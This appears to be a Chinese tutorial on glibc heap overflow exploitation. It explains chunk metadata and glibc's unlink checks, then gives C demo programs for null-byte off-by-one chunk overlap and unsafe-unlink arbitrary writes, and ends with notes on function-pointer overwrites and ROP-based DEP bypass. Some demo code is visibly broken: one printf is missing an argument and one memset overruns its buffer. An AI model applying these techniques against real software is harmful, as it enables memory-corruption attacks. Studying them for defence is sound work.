# 堆溢出利用技术分析
------
### 0x0 Glibc内存管理背景知识
#### 0.1 堆块结构
首先需要理解Libc的堆块结构：

```c
struct malloc_chunk {
	INTERNAL_SIZE_T prev_size;
	INTERNAL_SIZE_T size;
	struct malloc_chunk * fd;
	struct malloc_chunk * bk;
}
```
prev_size：相邻的前一个堆块大小。这个字段只有在前一个堆块（且该堆块为normal chunk）处于释放状态时才有意义，作用就是用于堆块释放时快速和相邻的前一个空闲堆块融合。该字段不计入当前堆块的大小计算。在前一个堆块不处于空闲状态时，数据为前一个堆块实际可占用的用户数据（比如32bit下执行A = malloc(0x62)，虽然名义上是0x62个字节的用户数据，但实际上0x60-0x64字节即是A实际可控的用户数据，也是下个堆块的prev_size字段，只是当前A在使用，prev_size没有意义）。libc这么做的原因主要是可以节约4个字节的内存空间，但为了这点空间效率导致了很多安全问题。

size：本堆块的长度。size = size字段长度+用户申请的长度+对齐字节长度（该值是不定值，需要内存布局计算），简单说就是从本堆块size字段开始到下个堆块size字段之间的数据长度（注意本堆块的prev_size字段不计入本堆块的大小计算之中）。libc以sizeof(size_T)*2为粒度对齐。例如32bit以8byte对齐，64bit以0×10对齐。因为最少以8字节对齐，所以size一定是8的倍数，故size字段的最后三位恒为0，libc用这三个bit做标志flag。比较关键的是最后一个bit（pre_inuse），用于指示相邻的前一个堆块是alloc还是free。如果正在使用，则bit=1。libc判断当前堆块是否处于free状态的方法就是判断下一个堆块的pre_inuse是否为1。这里也是double free和null byte offset等漏洞利用的关键。


************************************************************************
double free是指同一个堆块被释放了两次，为防止double free漏洞glibc加入防护措施，其原理是在执行free操作时检查当前堆块是否出于已经释放的状态，怎么判断呢？就是上面讲到的判断当前堆块的下个堆栈头部的pre_inuse字段是否为0？实则表示已经释放，阻止改操作；否则执行free操作。源码如下：
```c
glibc-2.23/malloc/malloc.c
3983     /* Or whether the block is actually not marked used.  */
3984     if (__glibc_unlikely (!prev_inuse(nextchunk)))
3985       {
3986         errstr = "double free or corruption (!prev)";
3987         goto errout;
3988       }

```
************************************************************************

fd &bk：双向指针，用于组成一个双向空闲链表。故这两个字段只有在堆块free后才有意义。堆块在alloc状态时，这两个字段内容是用户填充的数据，free状态时fd和bk填充链表节点地址，fd位于本堆块用户数据偏移0x0处，大小为size_t，bk位于用户数据偏移size_t处，大小也是size_t。两个字段可以造成内存泄漏（libc的bss地址），Dw shoot等效果。

值得一提的是，堆块根据大小，libc使用fastbin、chunk等逻辑上的结构代表，但其存储结构上都是malloc_chunk结构，只是各个字段略有区别，如fastbin相对于chunk，不使用bk这个指针，因为fastbin freelist是个单向链表。

#### 0.2 堆块分配对齐方式
首先理解堆分配的对齐方式为 size_t * 2，在32bit系统下对齐为8字节，64位系统下对齐是0x10字节，即32位分配任意大小的heap开始地址始终是8的倍数，64位下的heap开始地址为0x10的倍数。

其次，连续申请两个heap可能出现内存重合，重合的数据长度范围是 0-size_t，比如64位下先A=malloc(0x12)，再B=malloc(0x20)，则B-A=0x20，原因是0x12%0x10=2 < size_t，导致B的头部元素pre_size会与之重合，因为A堆块被使用，那么B的prev_size无用，A将占用剩下的6个字节（sizeof(prev_size) - 2）。再比如，64位系统下先申请A=malloc(0x19)，再申请B=malloc(0x20)，则B-A=0x30，原因是0x19%0x10=9 > size_t，如果像上面那种情况重合，会导致B头部的size字段被覆盖，因此B的头部只能从A + 0x10 + 0x10处开始，而B的地址则是A + 0x30处。

总之，如果满足0 < length % size_t*2 <= size_t，就会出现下个堆块的头部数据pre_size与上个堆块的heap user data重合，目的是为了提高空间利用率，具体的分类情况如下：
```c
1. length % size_t*2 = size_t 这种情况下，下个堆块的头部数据pre_size与上个堆块的heap user data完全重叠。
2. 0 < length % size_t*2 < size_t 这种情况下，下个堆块的头部数据pre_size与上个堆块的heap user data部分重叠。
3. size_t < length % size_t*2 < 2 * size_t 这种情况下，下个堆块的头部数据pre_size与上个堆块的heap user data不会发生重叠，原因是如果重叠将导致下个堆块头部的size字段被覆盖。
```
接下来列举示例来验证上面的结论（32bit系统下测试）：

```
#include <stdlib.h>
#include <stdio.h>

void
main(int argc, char *argv[]) {
        char *A1, *B1, *A2, *B2, *A3, *B3;

        A1 = malloc(0x64);
        B1 = malloc(0x33);
        printf("A1 is at %p, B1 is at %p, B1 - A1 should be 0x%x\n", A1, B1, );


        A2 = malloc(0x62);
        B2 = malloc(0x33);
        printf("A2 is at %p, B2 is at %p\n", A2, B2);

        A3 = malloc(0x66);
        B3 = malloc(0x33);
        printf("A3 is at %p, B3 is at %p\n", A3, B3);
}
```
运行结果如下：

```c
A1 is at 0x8abd008, B1 is at 0x8abd070
A2 is at 0x8abd4b0, B2 is at 0x8abd518
A3 is at 0x8abd550, B3 is at 0x8abd5c0

```
### 0x1 堆溢出示例
#### 1.1 修改要被释放堆块的pre_inuse和prev_size字段，free时向前融合其他堆块，再次malloc时即可控制被融合的堆
这种方法是通过修改要被释放的堆块头部字段中的pre_inuse和prev_size字段的值（例如本堆块的上个堆存在溢出的漏洞），然后再释放本堆块，由于本堆块的prev_size被恶意篡改，使得Glibc认为本堆块头部结构前面的prev_size字节范围的所有内存都是“上个堆块”的区间，如果“上个堆块”即是free状态同时能过safe unlink检查，就将导致本堆块向前融合，合并其他堆块（这部分堆处于alloc状态，正在使用中），导致“上个堆块”的空间全部被free，此时如果再次malloc恰好分配到“上个堆块”的空间，任意写入数据就能篡改被融合的那部分堆中的数据。

简单说，就是这种方法有可能篡改本堆块前面任意堆块中的数据，前面任意堆块却一无所知就被操控了。

下面结合glibc源码分析向前融合的过程：

```c
glibc-2.23/malloc/malloc.c
   4000     /* consolidate backward */
 ► 4001     if (!prev_inuse(p)) {
   4002       prevsize = p->prev_size;
   4003       size += prevsize;
   4004       p = chunk_at_offset(p, -((long) prevsize));
   4005       unlink(av, p, bck, fwd);
   4006     }
```
p是将被释放的堆块的头部结构指针，size是这个堆块的实际长度（注意不是用户申请长度），首先判断上个堆块是否处于释放状态，是则计算本堆块和上个堆块合计的长度（这部分区间全部将被释放），再算出上个堆块的头部结构的地址，然后调用unlink()函数(注意这里p是上个堆块头部结构的地址，不再是原本要释放的堆块头部结构地址，说明这里释放的是上个堆块+本堆块)，接下来查看unlink()函数代码：

```c
1410 /* Take a chunk off a bin list */
1411 #define unlink(AV, P, BK, FD) {                                            \
1412     if (__builtin_expect (chunksize(P) != (next_chunk(P))->prev_size, 0))      \
1413       malloc_printerr (check_action, "corrupted size vs. prev_size", P, AV);  \
1414     FD = P->fd;                                                               \
1415     BK = P->bk;                                                               \
1416     if (__builtin_expect (FD->bk != P || BK->fd != P, 0))                     \
1417       malloc_printerr (check_action, "corrupted double-linked list", P, AV);  \
1418     else {                                                                    \
1419         FD->bk = BK;                                                          \
1420         BK->fd = FD;                                                          \
1421         if (!in_smallbin_range (P->size)                                      \
1422             && __builtin_expect (P->fd_nextsize != NULL, 0)) {                \
1423             if (__builtin_expect (P->fd_nextsize->bk_nextsize != P, 0)        \
1424                 || __builtin_expect (P->bk_nextsize->fd_nextsize != P, 0))    \
1425               malloc_printerr (check_action,                                  \
1426                                "corrupted double-linked list (not small)",    \
1427                                P, AV);                                        \
1428             if (FD->fd_nextsize == NULL) {                                    \
1429                 if (P->fd_nextsize == P)                                      \
1430                   FD->fd_nextsize = FD->bk_nextsize = FD;                     \
1431                 else {                                                        \
1432                     FD->fd_nextsize = P->fd_nextsize;                         \
1433                     FD->bk_nextsize = P->bk_nextsize;                         \
1434                     P->fd_nextsize->bk_nextsize = FD;                         \
1435                     P->bk_nextsize->fd_nextsize = FD;                         \
1436                   }                                                           \
1437               } else {                                                        \
1438                 P->fd_nextsize->bk_nextsize = P->bk_nextsize;                 \
1439                 P->bk_nextsize->fd_nextsize = P->fd_nextsize;                 \
1440               }                                                               \
1441           }                                                                   \
1442       }                                                                       \
1443 }
```
1. 首先检查P下个堆块的prev_size是否等于P堆块的size，不相等报错。
2. 然后进行safe unlink判断，保证FD->bk == P && BK->fd == P成立，否则报错（网上讲述unlink检测机制主要就是指这句话），简单说就是P下个堆的上个堆必须是P，P上个堆的下个堆必须是P。
3. 上面两个条件均成立，执行FD->bk = BK和BK->fd = FD操作，即从链表中删除P。

总结下上述攻击思想若要成立，必须满足以下几个条件：
1. 有能力修改要被释放的堆块的pre_inuse和prev_size的值。
2. 保证被融合的起始堆块能过safe unlink安全检测（最简单的方法就是它本身就是free状态）。

下面的实例代码意在实现上述利用思想，具体如下：
```c
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
void main()
{
        char *x,*fast,* A, * B, * C;
        x = malloc(0x100 - 8);
        memset(x,'x',0x100 - 8);
        fast = malloc(1);
        memset(fast,'f',3);
        A = malloc(0x100 - 8);
        memset(A,'a',0x100 - 8);
        B = malloc(0x100 - 8);
        memset(B,'b',0x100 - 8);
        C = malloc(0x80 - 8);
        memset(C,'c',0x100 - 8);

        printf("x is at 0x%x, fast is at 0x%x, A is at 0x%x, B is at 0x%x, C is at 0x%x\n", x, fast, A, B, C);
        //x|fast|A|B|C
        //why fast is needed? 如果没有fast这个堆块，则释放x时，为了检测相邻的下一个堆块(A)是否释放，会去验证B头部的pre_size和pre_inuse，由于B的头部已经被篡改，故会出错。
        //
        /* A has a null byte offset vul.
         * A overflow to fast
         * change the pre_inuse bit
        */
        A[0xFc] = 0x00;
        //change the pre_size of B (in A's own memory)
        A[0xF8] = 0x10;
        A[0xF9] = 0x02;
        A[0xFa] = 0x00;
        A[0xFb] = 0x00;

        printf("before trigger vul, A: %s\n", A);
        printf("before trigger vul, fast: %s\n", fast);

        free(x);//aovid the safe unlinking when merge from x->B
        free(B);//merge from x to B . Then overlap fast and A
        char *new = malloc(0x150 - 8);
        memset(new,'w',0x150 - 8);
        printf("new is at 0x%x\n", new);
        printf("after trigger vul, A: %s\n", A);
        printf("after trigger vul, fast: %s\n", fast);
}
```
在堆块A中发生了null byte溢出，通过修改在A堆块内部的pre_size字段，使其长度为x + fast + A的长度之和。接着借助null byte溢出，修改了B堆块头部的第一个字节，把pre_inuse字段修改为0。这使libc错误的认为堆块B的前一个堆块处于空闲状态。
![null-byte](http://image.3001.net/images/20151229/1451369429576.png!small)

这时，如果释放堆块B，根据上边堆块释放过程章节所述，libc会首先根据pre_inuse判断相邻的前一个堆块是否处于释放状态，如果处于释放状态，则根据pre_size字段找到前一个堆块的头部，通过我们的前面一个步骤的操作，这里会找到堆块x的头部，并接着通过safe unlink操作把堆块x从freelist中卸下。为了safe unlink不会出错，比较方便的方法是让x处于空闲状态。故我们应该在释放堆块B之前释放x，这样堆块x到堆块B的整个空间就都被释放掉了。

值得注意的是，堆块x和堆块B之间必须间隔两个堆块。假如没有堆块fast，则我们在释放堆块x时，libc需要知道x相邻的后一个堆块A是否处于空闲状态，而获取这个信息是通过A的size字段找到堆块B，再根据堆块B的pre_inUse位来判断的。而上一步的操作已经使堆块B的pre_inuse字段为0了。这样libc就会以为堆块A处于空闲状态，而对A进行unlink操作而导致出错。（当然，如果释放堆块x在null byte溢出前发生则没有这个问题了）

![null-byte](http://image.3001.net/images/20151229/1451369429633.png!small)

#### 1.2 DwShoot
DwShoot修改被释放的heap的头部数据，pre_size和size，使得size的pre_inuse=0，从而向前融合，导致unlink()操作执行，达到DwShoot的目的。由于safe_unlink的检测，要构造fake_head的数据，使得它的fd和bc都指向某个内存ptr，且*ptr=to_free_p，从而绕过safe的检测，达到写数据的目的。但是如何控制写数据的地址为GOT表呢？
```
#include <stdlib.h>
long gl[0x40];
void main()
{
	//set global var
	memset(gl,'i',0x3F);
	char * A, * B, * C, * new;
	A = malloc(0x100 - 8); //
	memset(A,'a',0x100 - 8);
	B = malloc(0x100 - 8); //
	memset(B,'b',0x100 - 8);
	C = malloc(0x200 - 8); // for stable
	memset(C,'c',0x200 - 8);

	//pre_size,pre_inuse bit must be 1
	A[0xc]=0xf0,A[0xd]=0x01,A[0xe]=0x00,A[0xf]=0x00;
	 
	//fd, A->fd->bk == A + 8
	A[0x10]=0x94,A[0x11]=0xa0,A[0x12]=0x04,A[0x13]=0x08;
	 
	//bk, A->bk->fd == A + 8
	A[0x14]=0x98,A[0x15]=0xa0,A[0x16]=0x04,A[0x17]=0x08;
	 
	//change the pre_size of B (in A's own memory) , point to A's Fake Head
	A[0xF8]=0xF0,A[0xF9]=0x00,A[0xFA]=0x00,A[0xFB]=0x00;
	 
	//null byte offset , VUL!!!!!!! , change B's pre_inuse to 0 , then free B cause forward merge
	A[0xFC] = 0x00;
	
	gl[0x10] = A + 8;//avoid safe unlinking

	printf("gl[0x10] is located %p\n", &gl[0x10]);
	printf("Before DW , global[0x10] is : %p\n", gl[0x10]);
	free(B);//triger the merge , Then cause DW shoot
	printf("After DW , global[0x10] is : %p\n", gl[0x10]);
	printf("Done\n");
}
```
### 0x2 堆溢出：覆盖函数指针
<br />如果堆溢出时覆盖了某函数指针，当发生调用时进入精心构造的流程。但是，这种情况下利用很复杂，要过DEP，且不考虑ASLR的前提。<br>
<br />
windows绕DEP的方式：

*  A 栈溢出：构造ROP链，ROP链由一系列的***pop ,ret和system_fuction ,ret***等指令的地址构成。mona插件可自动构造。

*  B 堆溢出：首先需将esp指向堆，然后进入ROP链调用vtprotect等函数完成关DEP操作。mona可自动构造。

Linux绕DEP的方式：
网上资料主要都是基于栈溢出的绕DEP方式，实例也是stack overflow，用system覆盖返回地址，再往后两个单元填充“/bin/sh”的指针，布置都是栈数据，并非真正的堆利用。GDB Peda的ropgodget功能也无法获取正确的ROP链，缺少***[exchg r?x, esp]***和***[syscall, ret/systemfunc, ret]***的地址。仅仅pop pop ret无效，原因：

*  A ***[exchg r?x, esp]***可将栈切换到堆，堆溢出由于控制不了栈，但能欺骗esp指向堆。

*  B payload须实现调系统函数功能，它分成两种，自己写shellcode包含push parameter1，push parameter2，syscall指令实现，参数自己写在汇编指令里。此外，布置好堆中的数据，跳过去后执行ROP链，不通过代码传参，而是构造好填充在堆，使得执行系统函数时参数正确，构造的数据必须包含systemfunc的地址在其中。
<br>
<br />

上述解释了覆盖堆，控制不了栈，无法正确传参的问题。简言之：

*  A 寻找[exchg r?x, esp]指令，将栈切换到堆，系统此时认为堆就是栈。

*  B 个人认为，如果***函数参数从堆上取出***，那么覆盖堆也能控制参数，这得看具体的代码，有些堆利用就出现回调函数指针和参数同时定义在结构体里，然后堆覆盖后指针和参数都被控制了。

然后，解释了payload布置两种方式：

*  A 网上找的shellcode是自己写汇编提取出来的，参数都是代码push进去的，功能代码完全在堆【不行,DEP开启无法执行】

*  B 精心构造堆里的数据，让它像真正的ROP链，跳跳跳调用systemfunc，关闭DEP。
总之，首先需要将栈切换到堆，然后是精心布置堆里的数据 ROP完成关闭DEP的功能，最后ret到自己的shellcode中去执行真正的功能。
<br>

